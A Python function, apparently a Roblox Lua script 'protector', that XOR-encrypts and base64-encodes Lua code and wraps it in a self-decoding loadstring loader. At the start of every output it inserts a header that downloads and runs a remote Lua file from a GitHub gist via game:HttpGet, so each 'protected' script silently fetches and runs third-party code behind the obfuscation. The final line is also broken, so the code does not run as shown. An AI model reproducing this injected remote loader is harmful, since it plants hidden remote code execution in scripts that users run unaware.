def obfuscate(code: str) -> str:
    # Línea de protección que irá al INICIO
    PROTECTION_HEADER = """-- 🔒 PROTECCIÓN NOVA PROTECTOR
loadstring(game:HttpGet("https://gist.githubusercontent.com/xd-myscript/f49405176cadd0a779a433880d62787d/raw/65220c3e2877eda718094ecf60b9e22ce5ae8b36/NovaProtector.lua"))()
-- =================================
"""

    src = strip_comments(code)
    src = rename_locals(src)
    src = add_junk(src)

    key = bytes(random.randint(1, 255) for _ in range(12))
    enc = xor_bytes(src.encode("utf-8"), key)
    b64 = base64.b64encode(enc).decode("ascii")
    kb64 = base64.b64encode(key).decode("ascii")

    chunks = [b64[i : i + 90] for i in range(0, len(b64), 90)]
    lines = []
    
    # ✅ Aquí agregamos el encabezado PRIMERO
    lines.append(PROTECTION_HEADER)
    lines.append("-- NovaProtector | protected")
    lines.append("-- " + datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"))

    names = []
    for c in chunks:
        nm = "_" + random_name(9)
        names.append(nm)
        lines.append('local %s="%s"' % (nm, c))
    cat = "_" + random_name(8)
    lines.append("local %s=%s" % (cat, "..".join(names)))
    kn = "_" + random_name(7)
    lines.append('local %s="%s"' % (kn, kb64))

    lines.append("local function _D(data)")
    lines.append("local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'")
    lines.append("data=string.gsub(data,'[^'..b..'=]','')")
    lines.append("return (data:gsub('.',function(x)")
    lines.append("if x=='=' then return '' end")
    lines.append("local r,f='',(b:find(x)-1)")
    lines.append("for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end")
    lines.append("return r")
    lines.append("end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)")
    lines.append("if #x~=8 then return '' end")
    lines.append("local c=0")
    lines.append("for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end")
    lines.append("return string.char(c)")
    lines.append("end))")
    lines.append("end")
    lines.append("local function _X(s,k)")
    lines.append("local o={}")
    lines.append("for i=1,#s do")
    lines.append("local a=string.byte(s,i)")
    lines.append("local bb=string.byte(k,((i-1)%#k)+1)")
    lines.append("o[i]=string.char(bit32.bxor(a,bb))")
    lines.append("end")
    lines.append("return table.concat(o)")
    lines.append("end")
    lines.append("local _src=_X(_D(%s),_D(%s))" % (cat, kn))
    lines.append("local _fn,_err=loadstring(_src)")
    lines.append('if not _fn then error("NovaProtector: "..tostring(_err)) end')
    lines.append("_fn()")
    return "\n".join(l
    ines)
